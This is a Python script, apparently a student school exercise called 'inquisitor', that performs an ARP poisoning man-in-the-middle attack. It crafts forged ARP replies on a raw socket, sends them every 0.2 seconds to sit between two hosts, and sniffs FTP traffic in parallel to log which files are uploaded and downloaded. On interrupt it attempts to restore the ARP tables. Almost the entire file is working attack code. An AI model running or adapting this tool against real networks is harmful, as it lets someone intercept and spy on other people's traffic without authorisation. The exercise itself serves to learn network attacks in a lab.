# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: hubourge <hubourge@student.42angouleme.    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/06/23 15:42:16 by hubourge          #+#    #+#              #
#    Updated: 2025/06/25 16:11:41 by hubourge         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import socket
import struct
import sys
import time
import signal
import threading
import netifaces
from scapy.all import sniff, IP, TCP, Raw

ETHERNET_HEADER_FORMAT = "!6s6sH"       # Big Endian (!) Dest MAC (6s), Src MAC (6s), Type ARP (H)
ARP_HEADER_FORMAT = "!HHBBH6s4s6s4s"    # ARP struct
poisoning = True
interface = None
count = 0

def getInterface(target_ip=None):
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                ip = addr.get('addr')
                if target_ip:
                    if ip == target_ip:
                        return iface
                elif ip != "127.0.0.1":
                    return iface
    return None

def parsing():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <ip_src> <mac_src> <ip_target> <mac_target>")
        sys.exit(1)

    return sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    
def mac_to_bytes(mac):
    return bytes.fromhex(mac.replace(":", ""))

def build_arp_packet(src_mac, src_ip, dest_mac, dest_ip, target_mac, target_ip):
    dest_mac_bytes = mac_to_bytes(dest_mac)
    src_mac_bytes = mac_to_bytes(src_mac)
    target_mac_bytes = mac_to_bytes(target_mac)

    # Header Ethernet [Destination MAC] [Source MAC] [ARP]
    eth_header = struct.pack(ETHERNET_HEADER_FORMAT, dest_mac_bytes, src_mac_bytes, 0x0806)

    # Header ARP
    hw_type = 1              # Ethernet
    proto_type = 0x0800      # IPv4
    hw_size = 6              # MAC = 6 bytes
    proto_size = 4           # IP = 4 bytes
    opcode = 2               # ARP Reply

    arp_header = struct.pack(
        ARP_HEADER_FORMAT,
        hw_type,
        proto_type,
        hw_size,
        proto_size,
        opcode,
        src_mac_bytes,
        socket.inet_aton(src_ip),
        target_mac_bytes,
        socket.inet_aton(target_ip)
    )

    return eth_header + arp_header

def restore_arp(sock, src_mac, src_ip, dest_mac, dest_ip):
    packet = build_arp_packet(src_mac, src_ip, dest_mac, dest_ip, dest_mac, dest_ip)
    sock.send(packet)
    
    time.sleep(1)

    packet = build_arp_packet(dest_mac, dest_ip, src_mac, src_ip, src_mac, src_ip)
    sock.send(packet)

def handle_sigint(sig, frame):
        poisoning = False
        print(f"\n\n  Restore ARP table at {ip_target}")
        restore_arp(sock, mac_src, ip_src, mac_target, ip_target)
        print(f"  Restore ARP table at {ip_src}")
        restore_arp(sock, mac_target, ip_target, mac_src, ip_src)
        sys.exit(0)

def ftp_packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors="ignore")
        if payload.startswith("STOR") or payload.startswith("RETR"):
            filename = payload.strip().split(" ")[1]
            
            if payload.startswith("STOR"):
                direction = "Upload (STOR)"
            else:
                direction = "Download (RETR)"

            tmp_ip_src = packet[IP].src
            tmp_ip_dst = packet[IP].dst
            tmp_port_src = packet[TCP].sport
            tmp_port_dst = packet[TCP].dport

            print(f"\n  [FTP] {direction} -> {filename}")
            print(f"        From {tmp_ip_src}:{tmp_port_src} To {tmp_ip_dst}:{tmp_port_dst}")

def sniff_ftp_traffic():
    print("\n  Sniffing FTP traffic...")
    sniff(filter="tcp port 21", prn=ftp_packet_callback, store=0, iface=interface)

def resolve_hostname(hostname_or_ip):
    try:
        # Try reverse DNS lookup first
        hostname = socket.gethostbyaddr(hostname_or_ip)[0]
        return hostname
    except (socket.gaierror, socket.herror):
        try:
            # Fallback to getfqdn
            return socket.getfqdn(hostname_or_ip)
        except:
            return hostname_or_ip

def arpPoisoning(ip_src, mac_src, ip_target, mac_target):
    count = 0
    print("\n  Listening for ARP Request...")

    while True:
        try:
            packet = sock.recv(65536)
            if len(packet) < 42:
                continue
                
            eth_header = packet[:14]
            arp_header = packet[14:42]
            
            try:
                eth_dest_mac, eth_src_mac, eth_type = struct.unpack(ETHERNET_HEADER_FORMAT, eth_header)
                if eth_type != 0x0806: # ARP type
                    continue
                arp_hw_type, arp_proto_type, arp_hw_size, arp_proto_size, arp_opcode, arp_src_mac, arp_src_ip, arp_target_mac, arp_target_ip = struct.unpack(ARP_HEADER_FORMAT, arp_header)
                
                if arp_opcode == 1:  # ARP Request
                    src_ip_addr = socket.inet_ntoa(arp_src_ip)
                    target_ip_addr = socket.inet_ntoa(arp_target_ip)
                    src_hostname = resolve_hostname(src_ip_addr)
                    target_hostname = resolve_hostname(target_ip_addr)
                    packet_length = len(arp_header)
                    
                    print(f"  ARP, Request who-has {target_hostname} tell {src_hostname}, length {packet_length}")
                    if target_ip_addr == ip_target:
                        print(f"\n  ARP, Request who-has {target_hostname} tell {src_hostname}, length {packet_length}")
                        break
                        
            except struct.error as e:
                # Skip malformed packets
                continue
                
        except socket.timeout:
            # Continue waiting, this is normal
            continue
        except socket.error as e:
            print(f"\n  Socket error: {e}")
            continue
        except KeyboardInterrupt:
            print("\n  Interrupted by user")
            return

    print("\n  Starting ARP poisoning...")
    while poisoning:
        print(f"\r  [ARP REPLY] {count} - {ip_src_str} : {ip_target_str} is-at {mac_target} | {ip_target_str} : {ip_src_str} is-at {mac_src}", end='', flush=True)
        # print(f"  [ARP REPLY] to {ip_src_str} : {ip_target_str} is-at {mac_target} x{count}")
        pckt1 = build_arp_packet(mac_target, ip_target, mac_src, ip_src, mac_src, ip_src)
        # print(f"  [ARP REPLY] to {ip_target_str} : {ip_src_str} is-at {mac_src} x{count}")
        count += 1
        pckt2 = build_arp_packet(mac_src, ip_src, mac_target, ip_target, mac_target, ip_target)
        sock.send(pckt1)
        sock.send(pckt2)
        time.sleep(0.2)

def main():
    global ip_src, mac_src, ip_target, mac_target, ip_src_str, ip_target_str
    ip_src, mac_src, ip_target, mac_target = parsing()
    ip_src_str = resolve_hostname(ip_src)
    ip_target_str = resolve_hostname(ip_target)

    global interface
    # Use the actual network interface instead of loopback
    interface = getInterface(ip_src) or getInterface(ip_target) or "eth0"
    if not interface:
        print("No network interface found.")
        sys.exit(1)
    print(f"  Using interface: {interface}")

    global poisoning, sock
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind((interface, 0))
    
    # sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    signal.signal(signal.SIGINT, handle_sigint)

    print(f"\n  ARP Poisoning Attack")
    print(f"     Source IP:  {ip_src} ({ip_src_str})")
    print(f"     Source MAC: {mac_src}")
    print(f"     Target IP:  {ip_target} ({ip_target_str})")
    print(f"     Target MAC: {mac_target}")

    ftp_thread = threading.Thread(target=sniff_ftp_traffic, daemon=True)
    ftp_thread.start()
    time.sleep(2)

    arpPoisoning(ip_src, mac_src, ip_target, mac_target)

if __name__ == "__main__":
    main()
